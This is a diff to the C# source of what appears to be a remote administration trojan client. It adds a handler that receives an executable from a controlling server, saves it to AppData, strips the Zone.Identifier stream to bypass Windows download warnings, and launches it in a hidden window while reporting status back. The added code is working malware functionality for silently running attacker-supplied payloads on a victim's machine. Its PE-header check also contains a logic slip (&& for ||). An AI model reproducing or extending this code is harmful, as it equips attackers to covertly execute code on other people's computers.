@@ -88,6 +88,42 @@ namespace Core.Commands
 			})).Start();
 		}
 
+        public static void HandleUploadAndExecute(Core.Packets.ServerPackets.UploadAndExecute command, Core.Client client)
+        {
+            new Core.Packets.ClientPackets.Status("Uploading file...").Execute(client);
+
+            new Thread(new ThreadStart(() =>
+            {
+                byte[] fileBytes = command.FileBytes;
+                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+
+                try
+                {
+                    DeleteFile(tempFile + ":Zone.Identifier");
+
+                    if (fileBytes[0] != 'M' && fileBytes[1] != 'Z')
+                        throw new Exception("no pe file");
+
+                    File.WriteAllBytes(tempFile, fileBytes);
+
+                    ProcessStartInfo startInfo = new ProcessStartInfo();
+                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    startInfo.CreateNoWindow = true;
+                    startInfo.UseShellExecute = false;
+                    startInfo.FileName = tempFile;
+                    Process.Start(startInfo);
+                }
+                catch
+                {
+                    DeleteFile(tempFile);
+                    new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+                    return;
+                }
+
+                new Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+            })).Start();
+        }
+
 		public static void HandleUninstall(Core.Packets.ServerPackets.Uninstall command, Core.Client client)
 		{
 			new Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
